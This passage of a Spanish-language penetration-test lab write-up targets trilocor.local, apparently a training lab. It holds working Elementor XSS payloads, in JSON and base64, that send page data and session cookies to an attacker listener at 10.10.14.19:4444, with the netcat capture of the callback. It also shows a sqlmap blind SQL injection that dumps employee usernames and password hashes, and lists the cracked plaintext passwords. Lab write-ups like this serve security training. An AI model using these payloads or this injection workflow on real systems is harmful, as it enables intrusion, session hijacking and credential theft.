[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:00 <===================================================================================> (100 / 100) 100.00% Time: 00:00:00

[i] Medias(s) Identified:

[+] http://trilocor.local/?attachment_id=1
 | Found By: Attachment Brute Forcing (Aggressive Detection)
 
[+] http://trilocor.local/?attachment_id=2
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://trilocor.local/?attachment_id=3
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://trilocor.local/?attachment_id=4
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://trilocor.local/?attachment_id=5
 | Found By: Attachment Brute Forcing (Aggressive Detection)

<SNIP>

[+] http://trilocor.local/?attachment_id=98
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://trilocor.local/?attachment_id=99
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://trilocor.local/?attachment_id=100
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=========================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] No Users Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 19

[+] Finished: Tue Dec 16 03:40:42 2025
[+] Requests Done: 3611
[+] Cached Requests: 17
[+] Data Sent: 829.552 KB
[+] Data Received: 3.711 MB
[+] Memory used: 306.996 MB
[+] Elapsed time: 00:00:51
```

Encontramos multitud de vulnerabilidades, que podemos también ver aquí:

{% embed url="<https://wpscan.com/wordpress/376/>" %}

#### **Resumen de Hallazgos Críticos**

| Componente         | Versión                  | Estado                        | Vulnerabilidades Clave                               |
| ------------------ | ------------------------ | ----------------------------- | ---------------------------------------------------- |
| **WordPress**      | 5.8.3                    | **Desactualizado (35 vulns)** | SQLi via Link API, Multiple XSS, SSRF                |
| **Elementor**      | 3.5.3                    | **Desactualizado (23 vulns)** | XSS DOM Reflejado (CVE-2022-29455), Iframe Injection |
| **Astra Theme**    | ? (probablemente viejo)  | **Desactualizado (2 vulns)**  | Stored XSS (Contributor+)                            |
| **attachment\_id** | Todos (1-100) accesibles | **IDOR Confirmado**           | Acceso a archivos adjuntos                           |

#### Enumeración de plugins manual

Además de los descubiertos de Elementor, encontramos otros como `waypoints 4.0.2` que podría ser interesante.

```bash
curl -s http://trilocor.local/ | grep plugins

    <link rel="stylesheet" id="elementor-icons-css" href="/wp-content/plugins/elementor/assets/lib/eicons/css/elementor-icons.min.css?ver=5.13.0" media="all">
    <link rel="stylesheet" id="elementor-frontend-css" href="/wp-content/plugins/elementor/assets/css/frontend-lite.min.css?ver=3.5.3" media="all">
    <link rel="stylesheet" id="font-awesome-5-all-css" href="/wp-content/plugins/elementor/assets/lib/font-awesome/css/all.min.css?ver=3.5.3" media="all">
    <link rel="stylesheet" id="font-awesome-4-shim-css" href="/wp-content/plugins/elementor/assets/lib/font-awesome/css/v4-shims.min.css?ver=3.5.3" media="all">
    <link rel="stylesheet" id="elementor-icons-shared-0-css" href="/wp-content/plugins/elementor/assets/lib/font-awesome/css/fontawesome.min.css?ver=5.15.3" media="all">
    <link rel="stylesheet" id="elementor-icons-fa-solid-css" href="/wp-content/plugins/elementor/assets/lib/font-awesome/css/solid.min.css?ver=5.15.3" media="all">
    <script src="/wp-content/plugins/elementor/assets/lib/font-awesome/js/v4-shims.min.js?ver=3.5.3" id="font-awesome-4-shim-js"></script>
    <script src="/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.5.3" id="elementor-webpack-runtime-js"></script>
    <script src="/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.5.3" id="elementor-frontend-modules-js"></script>
    <script src="/wp-content/plugins/elementor/assets/lib/waypoints/waypoints.min.js?ver=4.0.2" id="elementor-waypoints-js"></script>
                "assets": "\/wp-content\/plugins\/elementor\/assets\/"
    <script src="/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.5.3" id="elementor-frontend-js"></script>
```

#### Enumeración de usuarios

No conseguimos enumerar usuarios mediante WP Scan, pero navegando por la web nos encontramos el apartado con los miembros del equipo con 3 personas:

<figure><img src="/files/f8BHQSPPFDhEe1DNiFZr" alt=""><figcaption></figcaption></figure>

Tenemos estos 3 usuarios:

* Yelon Husk
* Mario Palmer
* Kelly Williams

Crearemos un archivo de usuarios base con algunas variaciones básicas:

```bash
# Crear archivo de usuarios
cat > users.txt << EOF
yelon
yelon.husk
yelon_husk
yhusk
y.husk
mario
mario.palmer
mario_palmer
mpalmer
m.palmer
kelly
kelly.williams
kelly_williams
kwilliams
k.williams
admin
administrator
EOF
```

Probamos fuerza bruta con wpscan pero no encuentra nada, ya que no tiene XML-RPC activado ni una página de login para hacer fuerza bruta.

#### Conclusiones

Hemos llegado a un punto muerto en la estrategia actual.

1. No podemos enumerar usuarios: La API REST está inaccesible.
2. No podemos encontrar el panel de login: Fuzzing exhaustivo con múltiples wordlists y configuraciones ha fallado. La página debe tener un nombre completamente personalizado e imposible de adivinar.

#### Análisis del código fuente

Revisando el código fuente de la web principal nos encontramos con una variable javascript bastante interesante:

```html
    <script>
        /* <![CDATA[ */
        var rcewpp = {
            "ajax_url": "/wp-admin/admin-ajax.php",
            "nonce": "db7b6624d0",
            "home_url": "/",
        };
        /* ]]\> */
    </script>
```

Encontramos un **nonce válido** (`db7b6624d0`) que nos permite hacer acciones autenticadas via AJAX en WordPress.

#### Fuzzing de ruta de Ajax

Nos dice que la ruta `ajax_url` es `/wp-admin/admin-ajax.php`, pero no existe `wp-admin`, por lo que fuzzearemos para encontrar la ruta adecuada:

```bash
ffuf -u "http://trilocor.local/FUZZ/admin-ajax.php" \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://trilocor.local/FUZZ/admin-ajax.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

index.php               [Status: 200, Size: 251273, Words: 105040, Lines: 4662, Duration: 50ms]
```

Los resultados muestran que **solo `index.php` responde**, lo que sugiere que todas las rutas están siendo redirigidas o manejadas por `index.php`. Esto es típico de configuraciones con **mod\_rewrite** de Apache o frameworks de un solo punto de entrada.

1. **`/wp-admin/admin-ajax.php` → 404** pero...
2. **`/index.php/wp-admin/admin-ajax.php` → 200** (esto es clave)
3. **Todas las rutas pasan por `index.php`** (típico de WordPress con permalinks)

Esto significa que **la ruta correcta es**:

```
http://trilocor.local/index.php/wp-admin/admin-ajax.php
```

Lo verificamos con el siguiente comando

```bash
curl -I "http://trilocor.local/index.php/wp-admin/admin-ajax.php"

HTTP/1.1 200 OK
Date: Sun, 14 Dec 2025 19:53:53 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

#### Explotación de AYAX autenticado

Payload de XSS + AYAX

```json
{
    "type": "video",
    "url": "http://",
    "videoType": "hosted",
    "videoParams": {
        "onerror": "fetch('/wp-admin/admin-ajax.php?action=wp_get_popular_posts&nonce=db7b6624d0').then(r=>r.text()).then(d=>{window.location='http://10.10.14.19:4444/?data='+btoa(d)})",
        "style": "background-color:red"
    }
}
```

Con Cyberchef lo convertimos a base64:

{% code title="base64 payload" overflow="wrap" %}

```
ewogICAgInR5cGUiOiAidmlkZW8iLAogICAgInVybCI6ICJodHRwOi8vIiwKICAgICJ2aWRlb1R5cGUiOiAiaG9zdGVkIiwKICAgICJ2aWRlb1BhcmFtcyI6IHsKICAgICAgICAib25lcnJvciI6ICJmZXRjaCgnL3dwLWFkbWluL2FkbWluLWFqYXgucGhwP2FjdGlvbj13cF9nZXRfcG9wdWxhcl9wb3N0cyZub25jZT1kYjdiNjYyNGQwJykudGhlbihyPT5yLnRleHQoKSkudGhlbihkPT57d2luZG93LmxvY2F0aW9uPSdodHRwOi8vMTAuMTAuMTQuMTk6NDQ0NC8/ZGF0YT0nK2J0b2EoZCl9KSIsCiAgICAgICAgInN0eWxlIjogImJhY2tncm91bmQtY29sb3I6cmVkIgogICAgfQp9
```

{% endcode %}

#### Payload final

```
http://trilocor.local/#elementor-action:action=lightbox&settings=ewogICAgInR5cGUiOiAidmlkZW8iLAogICAgInVybCI6ICJodHRwOi8vIiwKICAgICJ2aWRlb1R5cGUiOiAiaG9zdGVkIiwKICAgICJ2aWRlb1BhcmFtcyI6IHsKICAgICAgICAib25lcnJvciI6ICJmZXRjaCgnL3dwLWFkbWluL2FkbWluLWFqYXgucGhwP2FjdGlvbj13cF9nZXRfcG9wdWxhcl9wb3N0cyZub25jZT1kYjdiNjYyNGQwJykudGhlbihyPT5yLnRleHQoKSkudGhlbihkPT57d2luZG93LmxvY2F0aW9uPSdodHRwOi8vMTAuMTAuMTQuMTk6NDQ0NC8/ZGF0YT0nK2J0b2EoZCl9KSIsCiAgICAgICAgInN0eWxlIjogImJhY2tncm91bmQtY29sb3I6cmVkIgogICAgfQp9
```

Al ejecutarlo en el navegador salta el XSS y nos devuelve una conexión a nuestro netcat, con lo que confirmamos que podemos hacer una petición:

```bash
nc -nlvp 4444

listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.14.17] 44198
GET /?data=PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4KPGh0bWw+PGhlYWQ+Cjx0aXRsZT40MDQgTm90IEZvdW5kPC90aXRsZT4KPC9oZWFkPjxib2R5Pgo8aDE+Tm90IEZvdW5kPC9oMT4KPHA+VGhlIHJlcXVlc3RlZCBVUkwgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+Cjxocj4KPGFkZHJlc3M+QXBhY2hlLzIuNC40MSAoVWJ1bnR1KSBTZXJ2ZXIgYXQgdHJpY29sb3IubG9jYWwgUG9ydCA4MDwvYWRkcmVzcz4KPC9ib2R5PjwvaHRtbD4K HTTP/1.1
Host: 10.10.14.17:4444
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://tricolor.local/
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Esto nos confirma que podríamos conseguir una cookie o hasta una reverse shell modificando nuestro JSON.

### <mark style="color:purple;">XSS</mark>

Lo primero que vamos a probar es un XSS que afecta a las versiones anteriores de 3.5.6 de Wordpress.

{% embed url="<https://wpscan.com/vulnerability/9758570b-4729-4eef-ad52-b6e922f536d6/>" %}

Para comprobarlo solamente accederemos a la siguiente URL:

```
http://trilocor.local/#elementor-action:action=lightbox&settings=ewogICAgInR5cGUiOiAidmlkZW8iLAogICAgInVybCI6ICJodHRwOi8vIiwKICAgICJ2aWRlb1R5cGUiOiAiaG9zdGVkIiwKICAgICJ2aWRlb1BhcmFtcyI6IHsKICAgICAgICAib25lcnJvciI6ImFsZXJ0KGRvY3VtZW50LmRvbWFpbisnICcrZG9jdW1lbnQuY29va2llKSIsCiAgICAgICAgInN0eWxlIjogImJhY2tncm91bmQtY29sb3I6cmVkIgogICAgfQp9
```

Y vemos que la alerta salta perfectamente mostrándonos nuestra cookie:

<figure><img src="/files/OEdHJaWkGUUMRJgWXZXL" alt=""><figcaption></figcaption></figure>

Y al darle okey mostraría un iframe rojo:

<figure><img src="/files/ulR2nEZDYAuT5IkyFGMZ" alt=""><figcaption></figcaption></figure>

Analizando el base64 del payload:

```
ewogICAgInR5cGUiOiAidmlkZW8iLAogICAgInVybCI6ICJodHRwOi8vIiwKICAgICJ2aWRlb1R5cGUiOiAiaG9zdGVkIiwKICAgICJ2aWRlb1BhcmFtcyI6IHsKICAgICAgICAib25lcnJvciI6ImFsZXJ0KGRvY3VtZW50LmRvbWFpbisnICcrZG9jdW1lbnQuY29va2llKSIsCiAgICAgICAgInN0eWxlIjogImJhY2tncm91bmQtY29sb3I6cmVkIgogICAgfQp9
```

Vemos que realmente le estamos pasando un JSON:

```json
{
    "type": "video",
    "url": "http://",
    "videoType": "hosted",
    "videoParams": {
        "onerror":"alert(document.domain+' '+document.cookie)",
        "style": "background-color:red"
    }
}
```

Y con un payload como este podríamos conseguir una cookie de sesión de un administrador, pero en este caso no hay ninguna cookie de admin:

```bash
echo '{
    "type": "video",
    "url": "http://",
    "videoType": "hosted",
    "videoParams": {
        "onerror":"fetch(\"http://10.10.14.19:4444/?cookie=\"+document.cookie)",
        "style": "background-color:red"
    }
}' | base64 -w 0
```

```
http://trilocor.local/#elementor-action:action=lightbox&settings=ewogICAgInR5cGUiOiAidmlkZW8iLAogICAgInVybCI6ICJodHRwOi8vIiwKICAgICJ2aWRlb1R5cGUiOiAiaG9zdGVkIiwKICAgICJ2aWRlb1BhcmFtcyI6IHsKICAgICAgICAib25lcnJvciI6ImZldGNoKFwiaHR0cDovLzEwLjEwLjE0LjE5OjQ0NDQvP2Nvb2tpZT1cIitkb2N1bWVudC5jb29raWUpIiwKICAgICAgICAic3R5bGUiOiAiYmFja2dyb3VuZC1jb2xvcjpyZWQiCiAgICB9Cn0K
```

<figure><img src="/files/jb8PIBB48aOeLYcmkDzf" alt=""><figcaption></figcaption></figure>

Probamos varias maneras de conseguir RCE encadenando XSS y Ajax pero sin éxito, así que anotaremos en el informe el hallazgo de `XSS Cross Site Scripting`, y seguimos.

#### Test de APIs disponibles

```json
{
    "type": "video",
    "url": "http://",
    "videoType": "hosted",
    "videoParams": {
        "onerror": "let apis=[];if(window.fetch)apis.push('fetch');if(window.XMLHttpRequest)apis.push('XMLHttpRequest');if(window.WebSocket)apis.push('WebSocket');if(window.importScripts)apis.push('importScripts');if(window.postMessage)apis.push('postMessage');if(window.eval)apis.push('eval');if(window.FileReader)apis.push('FileReader');alert('APIs: '+apis.join(', '))",
        "style": "background-color:red"
    }
}
```

```
http://trilocor.local/#elementor-action:action=lightbox&settings=ew0KICAgICJ0eXBlIjogInZpZGVvIiwNCiAgICAidXJsIjogImh0dHA6Ly8iLA0KICAgICJ2aWRlb1R5cGUiOiAiaG9zdGVkIiwNCiAgICAidmlkZW9QYXJhbXMiOiB7DQogICAgICAgICJvbmVycm9yIjogImxldCBhcGlzPVtdO2lmKHdpbmRvdy5mZXRjaClhcGlzLnB1c2goJ2ZldGNoJyk7aWYod2luZG93LlhNTEh0dHBSZXF1ZXN0KWFwaXMucHVzaCgnWE1MSHR0cFJlcXVlc3QnKTtpZih3aW5kb3cuV2ViU29ja2V0KWFwaXMucHVzaCgnV2ViU29ja2V0Jyk7aWYod2luZG93LmltcG9ydFNjcmlwdHMpYXBpcy5wdXNoKCdpbXBvcnRTY3JpcHRzJyk7aWYod2luZG93LnBvc3RNZXNzYWdlKWFwaXMucHVzaCgncG9zdE1lc3NhZ2UnKTtpZih3aW5kb3cuZXZhbClhcGlzLnB1c2goJ2V2YWwnKTtpZih3aW5kb3cuRmlsZVJlYWRlcilhcGlzLnB1c2goJ0ZpbGVSZWFkZXInKTthbGVydCgnQVBJczogJythcGlzLmpvaW4oJywgJykpIiwNCiAgICAgICAgInN0eWxlIjogImJhY2tncm91bmQtY29sb3I6cmVkIg0KICAgIH0NCn0=
```

<figure><img src="/files/JKpeLRLFWOxRCZgAKeQ6" alt=""><figcaption></figcaption></figure>

#### Test de capacidades de ejecución de código

```json
{
    "type": "video",
    "url": "http://",
    "videoType": "hosted", 
    "videoParams": {
        "onerror": "let capabilities=[];try{eval('1+1');capabilities.push('eval')}catch(e){}try{Function('return 1')();capabilities.push('Function')}catch(e){}try{setTimeout('alert(1)',1);capabilities.push('setTimeout string')}catch(e){}try{setInterval('alert(1)',1);capabilities.push('setInterval string')}catch(e){}alert('Code exec: '+(capabilities.length?capabilities.join(', '):'None'))",
        "style": "background-color:red"
    }
}
```

```
http://trilocor.local/#elementor-action:action=lightbox&settings=ew0KICAgICJ0eXBlIjogInZpZGVvIiwNCiAgICAidXJsIjogImh0dHA6Ly8iLA0KICAgICJ2aWRlb1R5cGUiOiAiaG9zdGVkIiwgDQogICAgInZpZGVvUGFyYW1zIjogew0KICAgICAgICAib25lcnJvciI6ICJsZXQgY2FwYWJpbGl0aWVzPVtdO3RyeXtldmFsKCcxKzEnKTtjYXBhYmlsaXRpZXMucHVzaCgnZXZhbCcpfWNhdGNoKGUpe310cnl7RnVuY3Rpb24oJ3JldHVybiAxJykoKTtjYXBhYmlsaXRpZXMucHVzaCgnRnVuY3Rpb24nKX1jYXRjaChlKXt9dHJ5e3NldFRpbWVvdXQoJ2FsZXJ0KDEpJywxKTtjYXBhYmlsaXRpZXMucHVzaCgnc2V0VGltZW91dCBzdHJpbmcnKX1jYXRjaChlKXt9dHJ5e3NldEludGVydmFsKCdhbGVydCgxKScsMSk7Y2FwYWJpbGl0aWVzLnB1c2goJ3NldEludGVydmFsIHN0cmluZycpfWNhdGNoKGUpe31hbGVydCgnQ29kZSBleGVjOiAnKyhjYXBhYmlsaXRpZXMubGVuZ3RoP2NhcGFiaWxpdGllcy5qb2luKCcsICcpOidOb25lJykpIiwNCiAgICAgICAgInN0eWxlIjogImJhY2tncm91bmQtY29sb3I6cmVkIg0KICAgIH0NCn0=
```

<figure><img src="/files/Ns4gzb6LCettkJC6lunB" alt=""><figcaption></figcaption></figure>

Probamos varios payloads para conseguir una shell con este método pero ninguno da resultado.

***

## <mark style="color:purple;">selfservicestg.trilocor.local</mark>

Esta página parece que sirve para resetear la contraseña de un email que introduzcamos:

<figure><img src="/files/rPoooCUuem8qBLvuUkkL" alt=""><figcaption></figcaption></figure>

#### Enumeración de tecnologías

{% code overflow="wrap" %}

```bash
whatweb http://selfservicestg.trilocor.local

http://selfservicestg.trilocor.local [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.101.223], JQuery[1.11.1], Script, Via-Proxy[1.1 selfservicestg.trilocor.local]
```

{% endcode %}

Observamos que es una web custom con Bootstrap sobre `Apache 2.4.41`.

#### Análisis web

Al introducir un email y darle a enviar nos dice que se ha enviado un email para cambiar la contraseña:

<figure><img src="/files/VzIXwNZhGCCtBenVdi9l" alt=""><figcaption></figcaption></figure>

Vamos a analizarlo con BurpSuite:

<figure><img src="/files/5xe68zjYt8GHymBbPbOV" alt=""><figcaption></figcaption></figure>

En principio no vemos nada raro, hace una petición POST a / y se envía el email en formato:

```
email=test%40mail.com
```

Además no podemos introducir comillas o scripts en el input, ya que está sanitizado, pero vamos a usar SQL Map para intentar algún tipo de SQLi. Para ello cambiamos el email de la petición por un asterisco en Burp Suite y le damos click derecho > copy to file.

### SQL Injection

```
sqlmap -r selfservice.req --batch --dbs --level 3 
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.4#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:29:37 /2025-12-16/

[19:29:37] [INFO] parsing HTTP request from 'selfservice.req'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[19:29:37] [INFO] testing connection to the target URL
[19:29:38] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:29:38] [INFO] testing if the target URL content is stable
[19:29:38] [INFO] target URL content is stable
[19:29:38] [INFO] testing if (custom) POST parameter '#1*' is dynamic
[19:29:38] [WARNING] (custom) POST parameter '#1*' does not appear to be dynamic
[19:29:38] [WARNING] heuristic (basic) test shows that (custom) POST parameter '#1*' might not be injectable
[19:29:38] [INFO] testing for SQL injection on (custom) POST parameter '#1*'
<SNIP>
[19:30:15] [INFO] checking if the injection point on (custom) POST parameter '#1*' is a false positive
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 361 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: email=' AND 7758=(SELECT (CASE WHEN (7758=7758) THEN 7758 ELSE (SELECT 5367 UNION SELECT 1817) END))-- Nfpn

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=' AND (SELECT 2692 FROM (SELECT(SLEEP(5)))FMxz)-- dPRp
---
[19:30:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[19:30:16] [INFO] fetching database names
[19:30:16] [INFO] fetching number of databases
[19:30:16] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[19:30:16] [INFO] retrieved: 3
[19:30:16] [INFO] retrieved: information_schema
[19:30:25] [INFO] retrieved: performance_schema
[19:30:33] [INFO] retrieved: status
available databases [3]:
[*] `status`
[*] information_schema
[*] performance_schema

[19:30:36] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/selfservicestg.trilocor.local'

[*] ending @ 19:30:36 /2025-12-16/
```

Bingo! Tenemos un SQL Injection que añadiremos a nuestro informe. Vamos a dumpear la base de datos. Nos interesa sobre todo la base de datos `status`, que no es la típica.

```
sqlmap -r selfservice.req --batch -D status --tables
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:36:24 /2025-12-16/

[19:36:24] [INFO] parsing HTTP request from 'selfservice.req'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[19:36:24] [INFO] resuming back-end DBMS 'mysql' 
[19:36:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: email=' AND 7758=(SELECT (CASE WHEN (7758=7758) THEN 7758 ELSE (SELECT 5367 UNION SELECT 1817) END))-- Nfpn

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=' AND (SELECT 2692 FROM (SELECT(SLEEP(5)))FMxz)-- dPRp
---
[19:36:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[19:36:24] [INFO] fetching tables for database: 'status'
[19:36:24] [INFO] fetching number of tables for database 'status'
[19:36:24] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[19:36:24] [INFO] retrieved: 2
[19:36:24] [INFO] retrieved: company
[19:36:27] [INFO] retrieved: employees
Database: status
[2 tables]
+-----------+
| company   |
| employees |
+-----------+
```

Tenemos dos tablas muy interesantes: `company` y `employees`. Vamos a extraer los datos inmediatamente:

```wasm
sqlmap -r selfservice.req --batch -D status -T employees --dump --threads=5
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:38:04 /2025-12-16/

[19:38:04] [INFO] parsing HTTP request from 'selfservice.req'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[19:38:04] [INFO] resuming back-end DBMS 'mysql' 
[19:38:04] [INFO] testing connection to the target URL

<SNIP>

[19:40:02] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[19:40:02] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[19:40:02] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[19:40:02] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[19:40:02] [INFO] starting 16 processes 
[19:40:15] [WARNING] no clear password(s) found                                                                                                                       
Database: status
Table: employees
[10 entries]
+----+----------------------------------+-----------+
| id | password                         | username  |
+----+----------------------------------+-----------+
| 1  | 3c97f91afa8fb9af0794af239cbbb058 | ccruz     |
| 2  | a9a79b92f99775bdb1d894aded7b803d | aslater   |
| 3  | 1fff997e5e49db13980f0439a30e6a12 | jjones    |
| 4  | 5d021edd6f252ec10292c18b22bfc84d | ohafner   |
| 5  | 014d12bce3de933995b33e6810ae00a9 | jwilson   |
| 6  | a3c9a219b342dfd3202e491fa46f54e6 | emercer   |
| 7  | 0134c84c4ac53f83878487a6d357c155 | ehoffman  |
| 8  | 2fe0a8809190f69d2c5525827ad84094 | bdavis    |
| 9  | d110faee335464f5289d9d40bb0dbade | ehamilton |
| 10 | 06e0f03a78f2d8b001d717a8a833801e | infra     |
+----+----------------------------------+-----------+

[19:40:15] [INFO] table '`status`.employees' dumped to CSV file '/home/kali/.local/share/sqlmap/output/selfservicestg.trilocor.local/dump/status/employees.csv'
[19:40:15] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/selfservicestg.trilocor.local'

[*] ending @ 19:40:15 /2025-12-16/
```

Tenemos los hashes de los usuarios del sistema y sus nombres de usuario! Los guardaremos en un archivo `valid-users.txt` que podemos usar con fuerza bruta en distintos servicios. Vamos a crackearlos rápidamente con Crackstation:

<figure><img src="/files/JogdKcGofltG6sd9ktGG" alt=""><figcaption></figcaption></figure>

Tenemos dos contraseñas en plano para 2 usuarios:

```
ccruz:hfgh
infra:!@#$bri@nn@!@#$
```

#### Hashcat Rules

Vamos a usar hashcat rules para intentar crackear más hashes:

```
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 1104517645

3c97f91afa8fb9af0794af239cbbb058:hfgh                     
5d021edd6f252ec10292c18b22bfc84d:ae12123 
```

Conseguimos otra contraseña más correspondiente al usuario `ohafner:ae12123`

Aunque no hayamos conseguido crackear todo puede que sea vulnerable a Pass The Hash si conseguimos establecernos en el dominio.

Añadiremos estos usuarios al apéndice del informe como `Compromised Users`, y el Hallazgo `SQL Injection`.

De igual manera dumpeamos la tabla company y obtenemos los emails corporativos de los usuarios:

```
sqlmap -r selfservice.req --batch -D status -T company --dump --threads=5
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.4#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:46:08 /2025-12-16/

[19:46:08] [INFO] parsing HTTP request from 'selfservice.req'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[19:46:09] [INFO] resuming back-end DBMS 'mysql' 
[19:46:09] [INFO] testing connection to the target URL
<SNIP>
[19:48:08] [INFO] retrieved: 10           
Database: status
Table: company
[10 entries]
+----+-----------------------------+------------+---------------+
| id | email                       | position   | employee_name |
+----+-----------------------------+------------+---------------+
| 1  | ccruz@ad.trilocor.local     | IC-2       | ccruz         |
| 2  | aslater@ad.trilocor.local   | IC-3       | aslater       |
| 3  | jjones@ad.trilocor.local    | IC-1       | jjones        |
| 4  | ohafner@ad.trilocor.local   | IC-2       | ohafner       |
| 5  | jwilson@ad.trilocor.local   | IC-2       | jwilson       |
| 6  | emercer@ad.trilocor.local   | IC-3       | emercer       |
| 7  | ehoffman@ad.trilocor.local  | IC-2       | ehoffman      |
| 8  | bdavis@ad.trilocor.local    | IC-3       | bdavis        |
| 9  | ehamilton@ad.trilocor.local | IC-1       | ehamilton     |
| 10 | infra@ad.trilocor.local     | IC-2       | infra         |
+----+-----------------------------+------------+---------------+

[19:48:08] [INFO] table '`status`.company' dumped to CSV file '/home/kali/.local/share/sqlmap/output/selfservicestg.trilocor.local/dump/status/company.csv'
[19:48:08] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/selfservicestg.trilocor.local'

[*] ending @ 19:48:08 /2025-12-16/
```

#### Versión, usuario y hostname de la BBDD

```
sqlmap -r selfservice.req --batch --banner --current-user --current-db --hostname

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.4#stable}
